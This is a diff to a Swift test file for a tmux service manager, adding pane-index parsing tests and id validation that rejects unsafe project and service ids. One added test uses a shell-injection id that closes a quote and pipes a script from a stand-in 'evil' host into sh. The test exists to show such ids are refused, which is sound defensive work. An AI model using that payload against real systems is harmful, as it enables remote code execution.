@@ -9,7 +9,7 @@ final class ServiceTests: XCTestCase {
     func testSessionNameRoundTrip() {
         let name = ServiceSession.name(projectId: "P1", serviceId: "S1")
         XCTAssertEqual(name, "muxa__P1__S1")
-        let parsed = ServiceSession.parse(name)
+        let parsed = ServiceSession.parse(name ?? "")
         XCTAssertEqual(parsed?.projectId, "P1")
         XCTAssertEqual(parsed?.serviceId, "S1")
     }
@@ -18,7 +18,7 @@ final class ServiceTests: XCTestCase {
     func testSessionNameRoundTripWithUUID() {
         let pid = "3F2504E0-4F89-11D3-9A0C-0305E82C3301"
         let sid = "A1B2C3D4-0000-1111-2222-333344445555"
-        let parsed = ServiceSession.parse(ServiceSession.name(projectId: pid, serviceId: sid))
+        let parsed = ServiceSession.parse(ServiceSession.name(projectId: pid, serviceId: sid) ?? "")
         XCTAssertEqual(parsed?.projectId, pid)
         XCTAssertEqual(parsed?.serviceId, sid)
     }
@@ -34,10 +34,10 @@ final class ServiceTests: XCTestCase {
     // MARK: list-panes 출력 파싱 — 상태의 진실 원천(서피스 렌더 불필요)
 
     func testParsePanesRunningAndDead() {
-        // 실측 포맷: '#{session_name}|#{pane_dead}|#{pane_dead_status}'
+        // 실측 포맷: '#{session_name}|#{pane_index}|#{pane_dead}|#{pane_dead_status}'
         let raw = """
-        muxa__P__web|0|
-        muxa__P__api|1|1
+        muxa__P__web|0|0|
+        muxa__P__api|0|1|1
         """
         let states = ServiceSession.parsePanes(raw)
         XCTAssertEqual(states["muxa__P__web"], .running)
@@ -45,20 +45,20 @@ final class ServiceTests: XCTestCase {
     }
 
     func testParsePanesNormalExitIsZero() {
-        XCTAssertEqual(ServiceSession.parsePanes("muxa__P__job|1|0")["muxa__P__job"], .exited(code: 0))
+        XCTAssertEqual(ServiceSession.parsePanes("muxa__P__job|0|1|0")["muxa__P__job"], .exited(code: 0))
     }
 
     /// dead=1 인데 status가 비어 있으면(신호 종료 등) 코드를 모른다 — -1로 두되 exited로는 확정한다.
     func testParsePanesDeadWithoutStatus() {
-        XCTAssertEqual(ServiceSession.parsePanes("muxa__P__x|1|")["muxa__P__x"], .exited(code: -1))
+        XCTAssertEqual(ServiceSession.parsePanes("muxa__P__x|0|1|")["muxa__P__x"], .exited(code: -1))
     }
 
     func testParsePanesIgnoresGarbage() {
         let raw = """
 
         garbage line without pipes
-        muxa__P__web|0|
-        |0|
+        muxa__P__web|0|0|
+        |0|0|
         """
         let states = ServiceSession.parsePanes(raw)
         XCTAssertEqual(states.count, 1)
@@ -152,9 +152,47 @@ final class ServiceTests: XCTestCase {
     /// 인용이 빠지면 zsh가 세션 이름을 명령 경로로 치환하려다 `not found`로 죽는다 —
     /// 도크가 로그를 아예 못 여는 치명적 버그였다.
     func testAttachCommandQuotesTarget() {
-        let cmd = TmuxService.attachCommand(projectId: "P", serviceId: "S")
+        let cmd = TmuxService.attachCommand(projectId: "P", serviceId: "S") ?? ""
         XCTAssertTrue(cmd.contains("'=muxa__P__S'"), "타겟이 인용되지 않았다: \(cmd)")
         XCTAssertFalse(cmd.contains(" =muxa"), "인용 안 된 '=' 가 셸에 노출됐다: \(cmd)")
+    }
+
+    /// **id는 신뢰 경계 밖이다**(state.v4.json은 사용자·외부가 쓴다). 따옴표가 든 id로 세션명을 만들면
+    /// attach 명령(유일하게 셸을 거치는 경로)에서 따옴표가 조기에 닫혀 임의 명령이 실행된다 —
+    /// 도크를 펼치는 순간에. 이름 자체를 만들지 않는다.
+    func testInjectionIdYieldsNoSessionName() {
+        let evil = "a'; curl -s http://evil/x.sh | sh; :'"
+        XCTAssertNil(ServiceSession.name(projectId: "P", serviceId: evil))
+        XCTAssertNil(ServiceSession.name(projectId: evil, serviceId: "S"))
+        XCTAssertNil(TmuxService.attachCommand(projectId: "P", serviceId: evil))
+    }
+
+    /// `__`가 든 id는 parse가 4토막이라 nil을 내는데 세션은 만들어져, 상태도 고아 정리도 못 하는
+    /// **조용한 좀비**가 된다. 이름 단계에서 막는다.
+    func testUnderscorePairIdYieldsNoSessionName() {
+        XCTAssertNil(ServiceSession.name(projectId: "P", serviceId: "we__b"))
+        XCTAssertNil(ServiceSession.parse("muxa__P__we__b")) // 만들어졌다면 파싱도 안 됐을 것이다
+    }
+
+    func testValidIdWhitelist() {
+        XCTAssertTrue(ServiceSession.isValidId("3F2504E0-4F89-11D3-9A0C-0305E82C3301"))
+        XCTAssertTrue(ServiceSession.isValidId("web1"))
+        XCTAssertFalse(ServiceSession.isValidId(""))
+        XCTAssertFalse(ServiceSession.isValidId("web dev")) // 공백
+        XCTAssertFalse(ServiceSession.isValidId("web_dev")) // 언더스코어
+        XCTAssertFalse(ServiceSession.isValidId("웹"))       // 비ASCII
+    }
+
+    // MARK: pane 0만 세션의 상태다 — attach해서 화면을 나눠도 판정이 흔들리지 않는다
+
+    /// 사용자가 도크에서 attach해 pane을 나누면 한 세션에 pane이 여럿 잡힌다. 전부 받아들이면
+    /// 마지막 줄이 이겨(딕셔너리 덮어쓰기) **죽은 서비스가 살아 있다고 보인다** — 옆 pane의 셸 때문에.
+    func testParsePanesUsesPaneZeroOnly() {
+        let raw = """
+        muxa__P__web|0|1|1
+        muxa__P__web|1|0|
+        """
+        XCTAssertEqual(ServiceSession.parsePanes(raw)["muxa__P__web"], .exited(code: 1))
     }
 
     // MARK: 살아있는 서비스 id 수집 — 고아 정리의 입력. 여기가 틀리면 멀쩡한 dev 서버를 죽인다.
